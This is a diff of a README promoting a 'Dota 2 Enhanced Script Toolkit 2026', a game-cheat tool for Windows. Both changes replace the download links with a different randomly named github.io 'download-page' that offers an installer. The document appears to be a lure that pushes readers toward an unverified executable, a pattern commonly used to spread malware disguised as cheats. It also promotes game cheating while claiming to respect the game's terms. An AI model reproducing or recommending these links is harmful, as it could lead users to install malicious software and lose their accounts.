@@ -2,7 +2,7 @@
 
 Welcome to the Dota 2 Enhanced Script Toolkit 2026, the ultimate solution for players seeking to enhance their gameplay with advanced scripting features. This toolkit is designed for Windows 10 and 11, providing a comprehensive suite of tools for real-time assistance and performance optimization in Dota 2, tailored for the 2026 season.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ Updates are released periodically, typically aligned with major Dota 2 patches o
 
 To get started, download the latest version of the Dota 2 Enhanced Script Toolkit 2026 from the official source:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: 2026. All rights reserved. This toolkit is intended for educational and personal use only. Always adhere to Dota 2's terms of service.*
 
